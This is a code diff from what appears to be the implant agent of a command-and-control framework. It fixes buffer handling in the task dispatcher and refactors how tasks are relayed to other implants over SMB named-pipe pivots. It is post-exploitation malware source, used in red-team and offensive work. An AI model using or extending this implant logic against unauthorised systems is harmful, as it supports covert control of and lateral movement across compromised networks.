@@ -47,7 +47,7 @@ VOID CommandDispatcher( VOID )
     PPACKAGE Package;
     PARSER   Parser         = { 0 };
     LPVOID   DataBuffer     = NULL;
-    UINT32   DataBufferSize = 0;
+    SIZE_T   DataBufferSize = 0;
     PARSER   TaskParser     = { 0 };
     LPVOID   TaskBuffer     = NULL;
     UINT32   TaskBufferSize = 0;
@@ -94,7 +94,10 @@ VOID CommandDispatcher( VOID )
 #else
         // SMB agents simply try to read from their Pipe
         if ( ! SMBGetJob( &DataBuffer, &DataBufferSize ) )
+        {
+            PUTS( "SMBGetJob failed" )
             continue;
+        }
 #endif
 
         if ( DataBuffer && DataBufferSize > 0 )
@@ -134,7 +137,7 @@ VOID CommandDispatcher( VOID )
             } while ( Parser.Length > 12 );
 
             MemSet( DataBuffer, 0, DataBufferSize );
-            Instance.Win32.LocalFree( *( PVOID* ) DataBuffer );
+            Instance.Win32.LocalFree( DataBuffer );
             DataBuffer = NULL;
 
             ParserDestroy( &Parser );
@@ -2390,14 +2393,14 @@ VOID CommandPivot( PPARSER Parser )
             PUTS( "DEMON_PIVOT_SMB_COMMAND" )
 
             UINT32      DemonId   = ParserGetInt32( Parser );
-            INT         Size      = 0;
             INT         Written   = 0;
             INT         Sent      = 0;
-            PVOID       Data      = ParserGetBytes( Parser, &Size );
+            BUFFER      Data      = { 0 };
             PPIVOT_DATA TempList  = Instance.SmbPivots;
             PPIVOT_DATA PivotData = NULL;
+            Data.Buffer           = ParserGetBytes( Parser, &Data.Length );
 
-            if ( ! Data || ! Size )
+            if ( ! Data.Buffer || ! Data.Length )
             {
                 PUTS( "Can't send empty data to pivot" )
                 return;
@@ -2418,17 +2421,13 @@ VOID CommandPivot( PPARSER Parser )
 
             if ( PivotData )
             {
-                while ( Sent != Size )
+                if ( ! PipeWrite( PivotData->Handle, &Data ) )
                 {
-                    if ( ! Instance.Win32.WriteFile( PivotData->Handle, U_PTR( Data ) + Sent, Size - Sent, &Written, NULL ) )
-                    {
-                        PRINTF( "WriteFile: Failed[%d]\n", NtGetLastError() );
-                        CALLBACK_GETLASTERROR
-                        break;
-                    }
-                    Sent += Written;
+                    PUTS( "PipeWrite failed" )
+                    CALLBACK_GETLASTERROR
                 }
-                PRINTF( "Successfully wrote %x bytes of data to demon %x\n", Size, DemonId )
+                else
+                    PRINTF( "Successfully wrote 0x%x bytes of data to demon %x\n", Data.Length, DemonId )
             } else PRINTF( "Didn't found demon pivot %x\n", DemonId )
 
             // DEMON_PIVOT_SMB_COMMAND does not send any response
